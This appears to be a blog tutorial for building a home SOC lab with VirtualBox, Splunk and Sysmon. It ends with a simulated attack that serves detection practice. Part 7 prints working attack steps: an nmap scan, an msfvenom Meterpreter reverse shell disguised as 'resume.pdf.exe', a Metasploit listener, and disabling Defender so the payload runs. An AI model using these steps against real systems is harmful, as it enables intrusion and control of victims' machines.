# How to Build a Cybersecurity Home Lab: VirtualBox, Splunk, and Live Attack Simulation

*Posted in: Cybersecurity, SOC Analyst, Splunk, SIEM, Home Lab, Kali Linux, Threat Detection*

---

Every great cybersecurity professional has one thing in common: **a place to break things safely.**

Whether you are studying for your first certification, pivoting into a Security Operations Center (SOC) role, or sharpening your penetration testing skills, theory alone will only take you so far. You need hands-on experience — but how do you safely execute malware, run network scans, or test exploits without risking your personal machine?

The answer is a **sandboxed home lab.**

In this guide, we will walk through how to build a fully functional cybersecurity home lab from scratch — covering VirtualBox setup, isolated lab networking, Splunk SIEM deployment, Windows log ingestion, Sysmon telemetry, and a live attack simulation using Kali Linux and Metasploit. By the end, you will have a complete attack-and-defend environment running on your own laptop.

---

## Why Virtualization is the Foundation of Every Home Lab

Running untrusted tools or malware on your personal machine is a serious risk. A single misstep could encrypt your files, corrupt your OS, or compromise your home network. To avoid this entirely, we use a **hypervisor** to create isolated virtual environments that run completely independently of your host machine.

For this guide, we are using **Oracle VM VirtualBox** — it is free, open-source, cross-platform, and trusted by thousands of cybersecurity professionals worldwide.

---

## Part 1 — Setting Up VirtualBox

### Step 1: Download and Install VirtualBox

Head to [virtualbox.org](https://www.virtualbox.org) and download the installer for your operating system.

> **Pro Tip — Verify Your Hash First:** Before installing any security tool, always verify the file's integrity. Open PowerShell and run:
> ```powershell
> Get-FileHash VirtualBox-7.x.x-Win.exe
> ```
> Compare the SHA-256 output against the hash listed on the official VirtualBox website. If they match, the file was not tampered with in transit. This is a habit every analyst should build from day one.

**Note:** If the installer throws an error, you likely need to install the **Microsoft Visual C++ 2019 Redistributable** package first. Download both the 32-bit and 64-bit versions from Microsoft, install them, restart your machine, then re-run the VirtualBox installer.

---

### Step 2: Set Up the Windows 10 Target Machine

Your Windows VM will serve as the **defender and victim machine** — the endpoint you monitor, generate logs from, and eventually protect.

1. **Get the ISO:** Download the official **Microsoft Media Creation Tool** and generate a clean Windows 10 ISO from [microsoft.com](https://www.microsoft.com/en-ca/software-download/windows10)
2. **Create the VM:** Open VirtualBox, click **New**, name your machine (e.g., `WIN-SOC-LAB`), and attach the ISO
3. **Allocate Resources:** A solid baseline is **4 GB RAM, 1–2 CPU cores, and 50 GB virtual disk space** — adjust based on your hardware
4. **Install Windows:** Boot the VM, click *"I don't have a product key"* when prompted, select **Windows 10 Pro**, choose a custom installation, and let it complete

Once Windows is installed, install the **VirtualBox Guest Additions** (Devices → Insert Guest Additions CD) for improved display resolution and shared clipboard functionality.

---

### Step 3: Set Up the Kali Linux Attacker Machine

Kali Linux is the industry-standard OS for offensive security, pre-loaded with virtually every penetration testing tool you will need. In this lab, it serves as your **attacker machine**.

1. Go to [kali.org](https://www.kali.org) and navigate to the downloads section
2. Download the **Pre-built Virtual Machine** for VirtualBox (64-bit)
3. Install **7-Zip** and use it to extract the downloaded archive
4. Inside the extracted folder, **double-click the `.vbox` file** — VirtualBox will automatically import the entire machine
5. Boot the VM and log in with the default credentials: **Username:** `kali` | **Password:** `kali`

> **Recommended:** Change the default Kali password immediately after first login using the `passwd` command.

---

## Part 2 — Building an Isolated Lab Network

Setting up your VMs is only half the job. If you leave networking on default NAT settings, you risk exposing your real laptop to whatever you are testing inside the lab. Proper network isolation is essential.

### The Golden Rule: Know Which Mode to Use

| Scenario | Network Mode | Why |
|---|---|---|
| Downloading tools, updating software | **NAT** | Internet access, host is protected |
| Running live exploits or malware | **Internal Network** | Fully isolated — no internet, no host exposure |

For attack simulation — which is what this guide builds toward — we use **Internal Network** mode.

---

### Step-by-Step: Building an Isolated Lab Subnet

#### 1. Configure Both VMs to Use Internal Network

In VirtualBox, go to each VM's **Settings → Network → Adapter 1**. Change the attachment from **NAT** to **Internal Network** and give it a consistent name — for example, `secure-lab`. Apply this to both your Windows and Kali VMs so they share the same virtual switch.

#### 2. Assign a Static IP to Windows 10

Since there is no DHCP server in an internal network, you need to configure IPs manually.

On the Windows VM, navigate to **Control Panel → Network and Internet → Network Connections**. Right-click your adapter → Properties → IPv4 → Use the following IP address:

```
IP Address:   192.168.20.10
Subnet Mask:  255.255.255.0
Gateway:      (leave blank)
```

#### 3. Assign a Static IP to Kali Linux

On the Kali VM, right-click the network icon → **Edit Connections → IPv4 Settings**. Change the method to **Manual**, click **Add**, and enter:

```
Address:  192.168.20.11
Netmask:  24
Gateway:  (leave blank)
```

Save and apply the settings.

#### 4. Test the Connection

On the Windows VM, open Command Prompt and run:
```
ping 192.168.20.11
```

If you receive replies, your isolated internal network is live and both machines can communicate with each other — and nothing else.

> **Do This Now — Take a Snapshot:** Before going any further, take a VirtualBox snapshot of both VMs (**Machine → Take Snapshot**). Name it `Network Baseline`. If anything breaks later, you can restore to this exact working state in seconds.

---

## Part 3 — Deploying Splunk Enterprise (Your SIEM)

With the lab environment built and isolated, it is time to add the brain of your SOC: **Splunk Enterprise**. This is the SIEM that will receive, index, and allow you to search all security log data generated in the lab.

### Installing Splunk Enterprise on Windows

1. Create a free account at [splunk.com](https://www.splunk.com)
2. Download the **Splunk Enterprise Windows 64-bit .msi** installer
3. Verify the SHA-256 hash before running:
   ```powershell
   Get-FileHash -Algorithm SHA256 'splunk-9.x.x-x64-release.msi'
   ```
4. Right-click the installer → **Run as administrator**
5. Accept the license, set your installation path, and create a strong **admin username and password** — this is your SIEM, protect it
6. Check **"Install Splunk as a Windows Service"** so it starts automatically
7. Click **Install** and wait 2–5 minutes for completion

Once installed, Splunk will open automatically in your browser at:
```
http://localhost:8000
```

Log in with your admin credentials to access the Splunk Web interface.

---

### Enable the Receiving Port (Port 9997)

Before the Splunk Universal Forwarder can send data to Splunk, you must configure Splunk to listen for incoming connections on TCP port 9997.

Go to **Settings → Forwarding and Receiving → Configure Receiving → Add New**.

Enter port `9997` and click **Save**.

Verify it is active by opening PowerShell and running:
```powershell
netstat -ano | findstr :9997
```
You should see `LISTENING` on `0.0.0.0:9997`.

---

### Create Dedicated Indexes

Indexes are Splunk's storage partitions — separating log sources makes searching significantly faster and cleaner. Go to **Settings → Indexes → New Index** and create the following:

| Index Name | Purpose |
|---|---|
| `endpoint` | All Windows event logs, Sysmon, PowerShell, and Defender logs |
| `windows_security` | Windows Security and System event logs (alternative dedicated index) |
| `network_logs` | Firewall and proxy logs |

Set each to a max size of **5 GB** — more than sufficient for a lab.

---

## Part 4 — Setting Up the Splunk Universal Forwarder

The **Splunk Universal Forwarder** is a lightweight agent installed on your Windows endpoint. It silently collects logs and ships them to your Splunk indexer over TCP port 9997. It has no search interface — it only collects and forwards.

### Installing the Universal Forwarder

1. Download the **Splunk Universal Forwarder Windows 64-bit .msi** from [splunk.com/en_us/download/universal-forwarder.html](https://www.splunk.com/en_us/download/universal-forwarder.html)
2. Right-click → **Run as administrator**
3. Select **"An on-premises Splunk Enterprise instance"**
4. Choose **Local System** account (important — virtual account may cause permission errors with Windows Event Logs)
5. Select the Windows Event Logs you want to forward: **Security**, **System**, and **Application**
6. Create forwarder admin credentials (separate from your Splunk Enterprise login)
7. **Skip the Deployment Server** for now
8. For the **Receiving Indexer**, enter:
   - Hostname: `127.0.0.1` (localhost, since both are on the same machine)
   - Port: `9997`
9. Click **Install**

After installation, open Services (`services.msc`), find **SplunkForwarder**, and restart it to force it to establish the initial connection to Splunk.

```powershell
Restart-Service -Name SplunkForwarder
Get-Service -Name SplunkForwarder   # Confirm: Status = Running
```

---

### Verifying the Forwarder is Connected

Log in to Splunk Web at `http://localhost:8000`. Go to **Settings → Forwarder Management**.

You will see a table showing your connected forwarder with columns for **Client Name**, **Agent Type**, **Version**, **Status**, and **Check-in time**. A status of **OK** confirms the forwarder is successfully communicating with Splunk.

Click the **Client Name** link to drill into the agent details — you will see the hostname, IP address, agent type, version, and real-time status. If everything looks correct, your log pipeline is live.

---

## Part 5 — Adding Windows Log Data to Splunk

With the forwarder verified, you can now configure exactly which Windows logs get ingested into Splunk.

From the Splunk Home dashboard, click the **Add Data** box in the Splunk Recommended section.

1. Select **Monitor**
2. Select **Local Event Logs**
3. Choose **Security** and **System** from the available event log channels, then click **Next**
4. On the Input Settings screen, you can adjust the host name and select an index — choose `endpoint` (or your preferred index)
5. Click **Review**, verify the configuration, then click **Submit**

Splunk will confirm the local event log input was created successfully. Click **Start Searching** to immediately see Windows event log data flowing in — your host will appear under the `host` field in the search results.

---

## Part 6 — Configuring Sysmon Log Ingestion

The Windows Event Log gives you useful security data, but **Sysmon (System Monitor)** gives you a dramatically richer picture — full process command lines, network connection details, file creation events, and registry changes. For SOC work, Sysmon is essential.

### Configure inputs.conf for Sysmon

Navigate to Splunk's local configuration directory:
```
C:\Program Files\Splunk\etc\system\local\
```

If `inputs.conf` does not exist here, copy it from the default folder:
```
C:\Program Files\Splunk\etc\system\default\inputs.conf
```

Open `inputs.conf` and add the following stanzas at the end of the file:

```ini
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
index = endpoint
disabled = false
renderXml = true
source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational

[WinEventLog://Microsoft-Windows-Windows Defender/Operational]
index = endpoint
disabled = false
source = Microsoft-Windows-Windows Defender/Operational
blacklist = 1151,1150,2000,1002,1001,1000

[WinEventLog://Microsoft-Windows-PowerShell/Operational]
index = endpoint
disabled = false
source = Microsoft-Windows-PowerShell/Operational
blacklist = 4100,4105,4106,40961,40962,53504

[WinEventLog://Application]
index = endpoint
disabled = false

[WinEventLog://Security]
index = endpoint
disabled = false

[WinEventLog://System]
index = endpoint
disabled = false
```

Save the file, then restart the **SplunkD** service to apply the changes:

1. Open **Services** (`services.msc`)
2. Find **SplunkD**
3. Right-click → **Restart**

> **Important:** The configuration above sends all logs to an index named `endpoint`. Make sure you have already created this index in Splunk (Settings → Indexes → New Index) before restarting the service, otherwise Splunk will not know where to store the data.

To help parse and visualize Sysmon data effectively, install the **Splunk Add-on for Sysmon** from Splunkbase: go to **Apps → Find More Apps** and search for "Sysmon". This add-on provides proper field extractions and CIM normalization for Sysmon events.

---

## Part 7 — Live Attack Simulation: Generating Telemetry to Catch Evil

Now for the part that makes all of this come together. We are going to simulate a real attack from the Kali machine, execute a payload on the Windows machine, and then hunt the evidence in Splunk using Sysmon logs.

> **Reminder:** This is your isolated internal network. Nothing here touches the internet or your real machine. This is precisely why we set up the network isolation in Part 2.

---

### Phase 1 — The Offensive Move (Kali Linux)

#### Reconnaissance — Scan the Target

From the Kali terminal, run an Nmap scan against the Windows machine to discover open ports and services:

```bash
nmap -A -Pn 192.168.20.10
```

The scan reveals that **Port 3389 (RDP — Remote Desktop Protocol)** is open. This is our attack surface.

#### Crafting the Payload

Using `msfvenom`, generate a reverse TCP shell disguised as a document:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.20.11 \
  LPORT=4444 \
  -f exe \
  -o resume.pdf.exe
```

This creates a Windows executable named `resume.pdf.exe` — a classic social engineering filename designed to look like a document to an unsuspecting user.

#### Setting Up the Listener

Open `msfconsole` on Kali and set up the Metasploit listener to catch the reverse shell when the payload executes:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.20.11
set LPORT 4444
run
```

Then host the payload file over HTTP so the Windows machine can download it:

```bash
python3 -m http.server 9999
```

---

### Phase 2 — The Bait (Windows 10)

On the Windows VM, temporarily disable **Windows Defender real-time protection** — raw Metasploit payloads are immediately flagged by modern AV, so this step is necessary to complete the simulation. In a real SOC environment, an attacker would use obfuscation; here we are keeping it simple to focus on the detection side.

Open a browser on the Windows VM, navigate to:
```
http://192.168.20.11:9999
```

Download `resume.pdf.exe` and double-click to execute it.

To confirm the connection is established, open an **Administrator Command Prompt** on Windows and run:
```
netstat -anob
```
You will see an **ESTABLISHED** connection from `resume.pdf.exe` back to the Kali IP on port 4444 — your reverse shell is live.

---

### Phase 3 — Threat Hunting in Splunk

Back on the Kali machine, you now have an active Meterpreter shell. Run a few standard attacker discovery commands to generate telemetry:

```bash
net user
net localgroup
ipconfig
```

These are the exact commands a real threat actor runs immediately after gaining access — enumerating users, groups, and network configuration to understand the environment.

Now switch to **Splunk** and hunt the evidence. Open Search & Reporting and run:

```
index=endpoint EventCode=1
```

**Sysmon Event Code 1** captures every process creation event with the full command line. Scan the results and look for `resume.pdf.exe`.

Once you find it, note the **Process GUID** — this unique identifier links every child process spawned by the payload. Filter on that GUID and Splunk will reconstruct the **complete execution chain**:

```
resume.pdf.exe → cmd.exe → net user
                          → net localgroup
                          → ipconfig
```

This is the **blueprint of an attack** — captured in raw log data, reconstructed by your SIEM, and now something you can write a permanent detection rule against.

---

## Key Takeaways

- **A sandboxed home lab is non-negotiable** for anyone serious about SOC analyst work — it bridges the gap between theory and real-world skill that employers actually test for
- **Network isolation is critical** — always use Internal Network mode when running exploits or malware, and always take a snapshot before each experiment
- **Splunk + Sysmon is the gold standard** for Windows endpoint visibility in a home lab — the combination gives you process creation, network connections, file events, and registry changes in a single pane of glass
- **Sysmon Event ID 1 (Process Creation)** is the most important event for detecting adversary behavior — the Process GUID links parent and child processes into a complete attack chain
- **The best way to learn detection is to understand offense** — running the attack yourself and then hunting it in your SIEM builds intuition that no certification can replicate

---

## Resources

- VirtualBox: [https://www.virtualbox.org](https://www.virtualbox.org)
- Windows 10 ISO: [https://www.microsoft.com/en-us/software-download/windows10](https://www.microsoft.com/en-us/software-download/windows10)
- Kali Linux VM: [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines)
- Splunk Enterprise (Free Trial): [https://www.splunk.com/en_us/download/splunk-enterprise.html](https://www.splunk.com/en_us/download/splunk-enterprise.html)
- Splunk Universal Forwarder: [https://www.splunk.com/en_us/download/universal-forwarder.html](https://www.splunk.com/en_us/download/universal-forwarder.html)
- Sysmon (Microsoft Sysinternals): [https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- SwiftOnSecurity Sysmon Config: [https://github.com/SwiftOnSecurity/sysmon-config](https://github.com/SwiftOnSecurity/sysmon-config)
- MITRE ATT&CK Framework: [https://attack.mitre.org](https://attack.mitre.org)

---

*Congratulations — you have built a fully functional attack-and-defend cybersecurity home lab. By seeing exactly how discovery commands appear in raw Sysmon log data, you can now write permanent Splunk alert rules to catch real threat actors attempting these same techniques in production networks. That is the difference between a SOC analyst who reads about threats and one who knows how to find them.*

---

*Found this useful? Share it with someone building their path into cybersecurity. The community gets stronger every time someone sets up their first home lab.*
